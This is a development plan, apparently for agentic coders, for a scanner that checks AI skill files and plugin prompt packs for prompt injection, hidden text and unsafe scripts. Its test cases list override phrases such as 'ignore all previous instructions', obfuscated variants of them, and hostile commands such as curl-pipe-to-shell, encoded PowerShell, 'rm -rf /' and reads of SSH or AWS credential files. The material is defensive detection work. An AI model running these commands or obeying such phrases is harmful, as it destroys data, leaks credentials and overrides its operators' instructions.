# Skill Install Scanning Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Every way a skill or prompt text reaches the model gets one deterministic scan with a verdict of clean, warn or block. Dangerous findings block for untrusted sources and warn for the operator's own folders.

**Architecture:** A pure core, `scanSkillContents(files, origin)`, takes file bytes and returns findings plus a verdict. Two thin readers feed it: an async one for imports and a sync one for discovery, because `buildSkillLifecycleRecord` is sync. The import path, Skill Hub, plugin prompt packs, workspace/managed discovery and self-authoring all call the same core. The verdict travels on a new `scanVerdict` field, never on `reviewWarning`, because `reviewWarning` turns a skill's trust posture to `blocked` (`routes/trust.ts:457`), which would break "warn".

**Tech Stack:** TypeScript, Fastify gateway, vitest, React (mission-control-next).

**Spec:** `docs/superpowers/specs/2026-11-25-skill-install-scanning-design.md`

## Global Constraints

- Operator origin = skill sources `workspace` and `managed` (`.assistant/skills`). Everything else (`extra`, Skill Hub, plugins, Claude Code plugin import, URL/Git) = untrusted. `bundled` is not scanned at discovery: it ships with GoatCitadel.
- Operator origin: a dangerous finding gives `warn`; the skill stays callable and its lifecycle state is unchanged.
- Untrusted origin: a dangerous finding gives `block`, with no override (`confirmHighRisk` cannot lift it).
- The scan is deterministic. No model calls, no network.
- Chat-path scanning (`assembled_prompt`, `memory_context`, `tool_output`, `delegated_output`, `scheduled_prompt`) behaves exactly as before.
- Cockpit copy is plain words. The cockpit-copy lint bans "snapshot", "Gateway" and "revision" in Cockpit text.
- No new dependencies. Tests use vitest with `--maxWorkers=2` at low priority; on Node 26 set `NODE_OPTIONS=--no-experimental-webstorage` for mc-next tests.
- After changing `packages/contracts`, rebuild it (`pnpm --filter @goatcitadel/contracts build`), because gateway and mc-next tests read its dist.

## Review Focus

1. A workspace skill whose README mentions `curl … | sh` as documentation: it must warn, not block, and stay callable. Owned by Task 5.
2. A Skill Hub skill with a binary file (e.g. a `.png` icon): ordinary images must not block. Only files with a text extension that fail to decode, or extensionless non-image binaries, count as unreadable. Owned by Task 3.
3. A large base64 blob in a skill (e.g. an embedded font in CSS): decoding must be bounded (first 64 KiB of each run, runs ≥ 200 chars), and a decode that isn't valid UTF-8 text must give no finding. Owned by Task 1.
4. An Arabic or Hebrew skill containing ordinary right-to-left text: the hidden-text rule must flag only the bidi *override/isolate controls* (U+202A–U+202E, U+2066–U+2069) and zero-width characters (U+200B–U+200D, U+2060, U+FEFF not at offset 0), never RTL letters. Owned by Task 1.
5. A workspace skill edited after its verdict was cached: the verdict must be recomputed when `treeSha256` changes. Owned by Task 5.

---

## PR (a): shared scan

### Task 1: Normalizing promptware scan for skill content

**Files:**
- Modify: `apps/gateway/src/services/assembled-prompt-injection-guard.ts`
- Test: `apps/gateway/src/services/assembled-prompt-injection-guard.skill-content.test.ts` (new)

**Interfaces:**
- Produces: `PromptwareRuleId` gains `"hidden_text_obfuscation"` (severity `"high"`). `PromptwareScanSource` gains `"plugin_prompt_pack"`. `PROMPTWARE_SCANNER_VERSION = "1.1.0"`, `PROMPTWARE_SCANNER_REVISION = 2`. Exported `SKILL_CONTENT_SOURCES: ReadonlySet<PromptwareScanSource> = new Set(["imported_skill", "plugin_prompt_pack"])`.

- [ ] **Step 1: Write failing tests**
  - `flags a fullwidth "ｉｇｎｏｒｅ previous instructions" in imported_skill` → ruleId `instruction_hierarchy_override`
  - `flags "ignore\u200b previous instructions" in imported_skill` → findings include `instruction_hierarchy_override` and `hidden_text_obfuscation`
  - `flags U+202E in plugin_prompt_pack` → `hidden_text_obfuscation`
  - `does not flag Hebrew text "שלום עולם" or a leading BOM`
  - `decodes a base64 run of "ignore all previous instructions" and flags it`
  - `ignores a 300-char base64 run that decodes to non-text bytes`
  - `leaves assembled_prompt unchanged: "ignore\u200b previous instructions" with source assembled_prompt gives no hidden_text_obfuscation finding`
- [ ] **Step 2: Run** `pnpm --filter @goatcitadel/gateway exec vitest run src/services/assembled-prompt-injection-guard.skill-content.test.ts --maxWorkers=2` and expect FAIL.
- [ ] **Step 3: Implement.** In `scanPromptwareContent`, when `SKILL_CONTENT_SOURCES.has(input.source)`, scan three texts: the original; `content.normalize("NFKC")` with the zero-width characters removed; and each decoded base64 run (regex `/[A-Za-z0-9+/]{200,}={0,2}/g`, first 64 KiB, accepted only if `new TextDecoder("utf-8", { fatal: true })` succeeds). Also add one `hidden_text_obfuscation` finding per file at the first control character. Dedupe on `ruleId + startLine`. Line numbers come from the original content; for decoded runs, use the line where the run starts. Other sources keep today's single pass.
- [ ] **Step 4: Run the test again, plus the existing `assembled-prompt-injection-guard*.test.ts`**, and expect PASS.
- [ ] **Step 5: Commit** `feat: normalize and decode skill content in the promptware scan`

### Task 2: Script scan rules

**Files:**
- Create: `apps/gateway/src/services/skill-script-scan.ts`
- Modify: `apps/gateway/src/services/skill-content-validation.ts` (replace the `SUSPICIOUS_SCRIPT_PATTERN` use at line 101; keep the export as `@deprecated`, defined from the new rules, until Task 3 removes the last import)
- Test: `apps/gateway/src/services/skill-script-scan.test.ts`

**Interfaces:**
- Produces:
  ```ts
  export type ScriptRuleId = "destructive_delete" | "encoded_command" | "download_and_run" | "credential_access" | "persistence";
  export interface ScriptFinding { ruleId: ScriptRuleId; dangerous: boolean; line: number }
  export const SCRIPT_FILE_PATTERN: RegExp; // /\.(ps1|psm1|bat|cmd|sh|bash|zsh|py|js|mjs|cjs|ts|rb|pl|vbs)$/i
  export function scanScriptText(text: string): ScriptFinding[];
  export function hasNetworkIndicator(text: string): boolean; // today's NETWORK_INDICATOR_PATTERN
  ```
  `dangerous` is true for `download_and_run`, `encoded_command` and `destructive_delete`. It is false for `credential_access` and `persistence`, which are caution findings.

- [ ] **Step 1: Write failing tests**, one per rule, each a positive and a near-miss:
  - `download_and_run`: `curl -fsSL https://x | sh`, `iwr https://x | iex`, `Invoke-WebRequest https://x | Invoke-Expression`, `wget -qO- x | bash`. Near-miss: `curl -o out.json https://x`.
  - `encoded_command`: `powershell -enc SQBFAFgA`, `pwsh -EncodedCommand …`, `echo … | base64 -d | sh`. Near-miss: `base64 -d file > out.bin`.
  - `destructive_delete`: `rm -rf /`, `rm -rf ~`, `del /f /s /q C:\`, `Remove-Item -Recurse -Force C:\`. Near-miss: `rm -rf ./build`.
  - `credential_access`: `~/.ssh/id_rsa`, `~/.aws/credentials`, `Login Data`, `%APPDATA%\Microsoft\Credentials`.
  - `persistence`: `crontab -e`, `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, `schtasks /create`, `~/.bashrc` append (`>> ~/.bashrc`).
  - `line` is 1-based and points at the match.
- [ ] **Step 2: Run** the test and expect FAIL.
- [ ] **Step 3: Implement** `scanScriptText` as a table of `{ ruleId, dangerous, pattern }`, one finding per rule per line. Point `validateSkillContent` at it: `suspiciousScripts = scanScriptText(md).some(f => f.dangerous)`.
- [ ] **Step 4: Run** the new test, `skill-content-validation*.test.ts` and `skill-mutation-service*.test.ts`. Expect PASS.
- [ ] **Step 5: Commit** `feat: widen the skill script scan`

### Task 3: Shared skill content scan and verdict

**Files:**
- Create: `apps/gateway/src/services/skill-content-scan.ts`
- Modify: `packages/contracts/src/capabilities.ts` (types below)
- Test: `apps/gateway/src/services/skill-content-scan.test.ts`

**Interfaces:**
- Consumes: Task 1 `scanPromptwareContent` with source `"imported_skill"`; Task 2 `scanScriptText`, `SCRIPT_FILE_PATTERN`, `hasNetworkIndicator`.
- Produces in contracts:
  ```ts
  export type SkillScanFindingCode = "prompt_injection" | "hidden_text" | "unsafe_script" | "risky_script" | "network_use" | "unreadable_file" | "scan_incomplete";
  export interface SkillScanFinding { code: SkillScanFindingCode; path: string; line?: number; dangerous: boolean }
  export type SkillScanVerdict = "clean" | "warn" | "block";
  export interface SkillScanSummary { verdict: SkillScanVerdict; findings: SkillScanFinding[]; scannerVersion: string; treeSha256?: string }
  ```
  Also `SkillLifecycleRecord.scanVerdict?: SkillScanSummary`.
- Produces in gateway:
  ```ts
  export type SkillScanOrigin = "operator" | "untrusted";
  export interface SkillScanFile { path: string; bytes: Uint8Array }
  export function scanSkillContents(files: readonly SkillScanFile[], origin: SkillScanOrigin, opts?: { truncated?: boolean }): SkillScanSummary;
  export async function readSkillScanFiles(dir: string): Promise<{ files: SkillScanFile[]; truncated: boolean }>;
  export function readSkillScanFilesSync(dir: string): { files: SkillScanFile[]; truncated: boolean };
  export const SKILL_SCAN_MAX_FILES: number;    // reuse MAX_SKILL_SCAN_FILES's value from skill-import-service
  export const SKILL_SCAN_MAX_FILE_BYTES = 220_000;
  ```

- [ ] **Step 1: Write failing tests** for `scanSkillContents`:
  - Clean `SKILL.md` gives `{ verdict: "clean", findings: [] }` for both origins.
  - `SKILL.md` with "ignore all previous instructions" gives a `prompt_injection` finding (dangerous). Untrusted gives `block`; operator gives `warn`.
  - `install.sh` with `curl x | sh` gives `unsafe_script` (dangerous). Untrusted gives `block`; operator gives `warn`.
  - `setup.py` with `~/.ssh/id_rsa` gives `risky_script`, not dangerous, so `warn` for both origins.
  - `notes.md` with `https://example.com` gives `network_use`, not dangerous, so `warn`.
  - `config.yaml` with `ignore previous instructions` is flagged (promptware now reads `.md`, `.txt`, `.json`, `.yaml`, `.yml`, `.toml`, `.html`, and comments in script files).
  - `data.json` with invalid UTF-8 bytes gives `unreadable_file` (dangerous). Untrusted gives `block`; operator gives `warn`.
  - `icon.png` with arbitrary bytes gives no finding (image/font extensions `png jpg jpeg gif webp ico svg woff woff2 ttf otf` are skipped; `svg` is scanned as text).
  - A file over `SKILL_SCAN_MAX_FILE_BYTES`, or `opts.truncated`, gives `scan_incomplete`. It is dangerous for untrusted (matching today's `PROMPTWARE_SCAN_INCOMPLETE` error) and gives `warn` for operator.
  - Findings are sorted by `path` then `line`, and capped at 32.
- [ ] **Step 2: Run** the test and expect FAIL.
- [ ] **Step 3: Implement.** Verdict rule: no findings → `clean`; any dangerous finding with untrusted origin → `block`; otherwise → `warn`. Move the directory walk out of `scanSkillDirectory` (`skill-import-service.ts:2991`) into the two readers: skip `.git`, add no symlink handling (the loader already refuses symlinks), and stop at `SKILL_SCAN_MAX_FILES` with `truncated: true`. `scannerVersion` is `PROMPTWARE_SCANNER_VERSION`.
- [ ] **Step 4: Rebuild contracts, run** the test and expect PASS.
- [ ] **Step 5: Commit** `feat: add one shared skill content scan with a verdict`

### Task 4: Imports and Skill Hub use the shared scan

**Files:**
- Modify: `apps/gateway/src/services/skill-import-service.ts`: `validateMaterialized` (~1612–1800); delete `scanSkillDirectory`, `scanPromptwareIntegrityFiles` and `tryReadFileText`.
- Modify: `apps/gateway/src/services/skill-hub-lifecycle-service.ts` (~985–1015, the promptware loop over `artifact.manifest.files`).
- Modify: `packages/contracts/src/skill-hub-lifecycle.ts`: add `"HIDDEN_TEXT_DETECTED"` and `"UNREADABLE_SKILL_FILE"` to `SKILL_HUB_BLOCKER_CODES`.
- Modify: `apps/mission-control-next/src/cockpit/areas/capabilities/skills/skill-check-copy.ts`: add `HIDDEN_TEXT_DETECTED: "Its files contain hidden or disguised text."` and `UNREADABLE_SKILL_FILE: "Some of its files can't be read, so they couldn't be checked."`.
- Test: the existing `skill-import-service*.test.ts` and `skill-hub-lifecycle-service*.test.ts`, plus a new `skill-import-service.scan-verdict.test.ts`.

**Interfaces:**
- Consumes: Task 3 `readSkillScanFiles`, `scanSkillContents(files, "untrusted")`.
- Produces: `SkillImportValidationResult.scanVerdict: SkillScanSummary` (add it to the contracts type next to `riskLevel`). Today's `checks`, `suspiciousSignals`, `networkSignals`, `promptwareFindings` and `promptwareUnscannedPaths` are kept, derived from the findings, so existing callers and the UI don't change.

- [ ] **Step 1: Write failing tests** in `skill-import-service.scan-verdict.test.ts`, materializing a local folder source:
  - `curl x | sh` in `scripts/install.sh` gives `valid: false`, `riskLevel: "high"`, and an error naming `scripts/install.sh`.
  - `confirmHighRisk: true` on install of that same source still refuses.
  - An invalid-UTF-8 `notes.txt` gives `valid: false`.
  - A clean skill with a `.png` gives `valid: true` and `scanVerdict.verdict: "clean"`.
  - A `README.md` with `https://` gives `valid: true` and `scanVerdict.verdict: "warn"`, with a network warning kept.
  - In Skill Hub (`skill-hub-lifecycle-service`): a `.yaml` file containing the injection phrase gives blocker `PROMPT_INJECTION_DETECTED`; a zero-width injection gives `HIDDEN_TEXT_DETECTED`.
- [ ] **Step 2: Run** the tests and expect FAIL.
- [ ] **Step 3: Implement.** In `validateMaterialized`, push one error per dangerous finding with path (plain wording, as today's errors), and one warning per non-dangerous finding. `deriveRiskLevel` gets `suspiciousScripts = findings.some(f => f.code === "unsafe_script")`. In Skill Hub, map `prompt_injection` → `PROMPT_INJECTION_DETECTED`, `hidden_text` → `HIDDEN_TEXT_DETECTED`, `unsafe_script` → `SUSPICIOUS_SCRIPT_INDICATOR`, `unreadable_file` → `UNREADABLE_SKILL_FILE`, `scan_incomplete` → `PROMPTWARE_SCAN_INCOMPLETE`. Skill Hub reads through `readVerifiedText` as today. Pass its verified texts as `SkillScanFile` (UTF-8 encode), and record `unreadable_file` for a read that throws on a text extension. Remove the last `SUSPICIOUS_SCRIPT_PATTERN` import and the deprecated export.
- [ ] **Step 4: Run** the new tests, all `skill-import-service*.test.ts`, `skill-hub-lifecycle*.test.ts`, `packages/contracts` tests (the blocker-code copy test) and mc-next `skill-check-copy.test.ts`. Then `pnpm --filter @goatcitadel/gateway typecheck`. Expect PASS.
- [ ] **Step 5: Commit** `feat: imports and Skill Hub use the shared skill scan`

---

## PR (b): paths that skip the scan

### Task 5: Verdicts for the operator's own skills

**Files:**
- Modify: `apps/gateway/src/services/capability-system-service.ts`: `buildSkillLifecycleRecord` (~5905) and the cached-record merge at ~740–770.
- Test: `apps/gateway/src/services/capability-system-service.skill-scan.test.ts` (new)

**Interfaces:**
- Consumes: Task 3 `readSkillScanFilesSync`, `scanSkillContents(files, "operator")`.
- Produces: `SkillLifecycleRecord.scanVerdict` set for `workspace` and `managed` skills; `treeSha256` comes from the integrity manifest `readSkillSourceManifest` already captures.

- [ ] **Step 1: Write failing tests:**
  - A workspace skill with "ignore all previous instructions" in `SKILL.md` gets `lifecycleState: "approved"`, `scanVerdict.verdict: "warn"` with a `prompt_injection` finding, `reviewWarning` undefined, and it stays in the callable catalog.
  - A managed skill with `curl x | sh` in a script gets `lifecycleState: "trusted"` and `scanVerdict.verdict: "warn"`.
  - A clean workspace skill gets `scanVerdict.verdict: "clean"`.
  - A bundled skill gets no `scanVerdict`.
  - Rebuilding with an unchanged `treeSha256` reuses the cached summary: spy on `readSkillScanFilesSync`, called once across two rebuilds. Changing a file recomputes it (Review Focus 5).
- [ ] **Step 2: Run** the tests and expect FAIL.
- [ ] **Step 3: Implement.** A module-level `Map<string, SkillScanSummary>` keyed by `skillId + treeSha256`, holding at most 512 entries (drop the oldest). Skip the scan when integrity isn't `verified`: those skills are already non-callable. Carry `scanVerdict` through the existing-record merge wherever `reviewWarning` is carried today.
- [ ] **Step 4: Run** the new test and the existing `capability-system-service*.test.ts`. Expect PASS.
- [ ] **Step 5: Commit** `feat: scan the operator's own skills and record a warning verdict`

### Task 6: Plugin prompt packs are scanned before install

**Files:**
- Modify: `apps/gateway/src/services/capability-plugin-inspection-service.ts`: `checkPromptPack` (~509), after `readSnapshotText`.
- Test: the existing plugin inspection test file for prompt packs (`capability-plugin-inspection-service*.test.ts`), with new cases.

**Interfaces:**
- Consumes: Task 1 `scanPromptwareContent({ source: "plugin_prompt_pack", sourcePath: piece.path, content })`; Task 4 blocker codes.

- [ ] **Step 1: Write failing tests:**
  - A plugin whose prompt pack says "ignore all previous instructions" gives an inspection with that piece `check.status: "blocked"`, code `PROMPT_INJECTION_DETECTED`, and `installable: false`.
  - A pack with a U+202E control gives code `HIDDEN_TEXT_DETECTED`.
  - A clean pack is unchanged from today.
- [ ] **Step 2: Run** the tests and expect FAIL.
- [ ] **Step 3: Implement:** first finding → `unread(blocked(code, SKILL_BLOCKER_COPY-equivalent message))`. Use gateway-side messages with the same wording as Task 4's cockpit copy.
- [ ] **Step 4: Run** the new cases, all `capability-plugin-*.test.ts`, and gateway typecheck. Expect PASS.
- [ ] **Step 5: Commit** `feat: scan plugin prompt packs during inspection`

---

## PR (c): show the verdict

### Task 7: Warning label and findings in Capabilities › Skills

**Files:**
- Modify: `packages/contracts/src/capability-skills.ts`: the skill view type gains `scanVerdict?: SkillScanSummary`.
- Modify: `apps/gateway/src/services/capability-skills-projection.ts` (~221): project `scanVerdict` next to `reviewWarning`.
- Modify: `apps/mission-control-next/src/cockpit/areas/capabilities/skills/skill-check-copy.ts`: add `SKILL_SCAN_FINDING_COPY: Record<SkillScanFindingCode, string>`:
  - `prompt_injection`: "Its instructions try to override GoatCitadel's rules."
  - `hidden_text`: "Its files contain hidden or disguised text."
  - `unsafe_script`: "It includes scripts that look unsafe."
  - `risky_script`: "Its scripts touch passwords, keys or startup settings."
  - `network_use`: "It reaches out to the internet."
  - `unreadable_file`: "Some of its files can't be read, so they couldn't be checked."
  - `scan_incomplete`: "Some of its files couldn't be checked."
- Modify: `SkillRow.tsx` (a "Warning" pill when `scanVerdict?.verdict === "warn"`) and `SkillPanelDetail.tsx` (a "What the check found" disclosure listing each finding's sentence and path).
- Test: `skill-check-copy.test.ts`, `SkillPanel.test.tsx`, `capability-skills-projection*.test.ts`.

- [ ] **Step 1: Write failing tests:**
  - Every `SkillScanFindingCode` has copy, checked against a contracts-exported `SKILL_SCAN_FINDING_CODES` array.
  - The projection carries `scanVerdict`.
  - `SkillPanel` with a warn skill shows the "Warning" pill; opening the disclosure lists "It includes scripts that look unsafe." and `scripts/install.sh`. A clean skill shows no pill.
- [ ] **Step 2: Run** the tests and expect FAIL.
  - The install review (`SkillInstallPanel`) for an import with a `network_use` warning lists that warning before the install button. If it already shows validation warnings today, this test only pins that, and no new code is needed.
- [ ] **Step 3: Implement** the pill using the existing status-pill component that `SkillRow` already uses for other states (match its tone tokens for caution). The disclosure is collapsed by default, so details stay on demand.
- [ ] **Step 4: Run** the tests, mc-next typecheck and `pnpm lint` (cockpit-copy check). Expect PASS.
- [ ] **Step 5: Rendered check.** Use a throwaway token-mode Gateway on 18787 with a scratch root holding one warn workspace skill, plus the worktree Vite. Check the skill row, the open disclosure, the light and dark themes, phone width, and keyboard focus through the disclosure. Report what was seen.
- [ ] **Step 6: Commit** `feat: show the skill scan verdict in Capabilities › Skills`

---

## Final validation (each PR)

- `pnpm --filter @goatcitadel/gateway typecheck` and `pnpm --filter @goatcitadel/mission-control-next typecheck` (via the output-lock wrappers where the scripts have them)
- `pnpm verify:fast`
- `git diff --check`
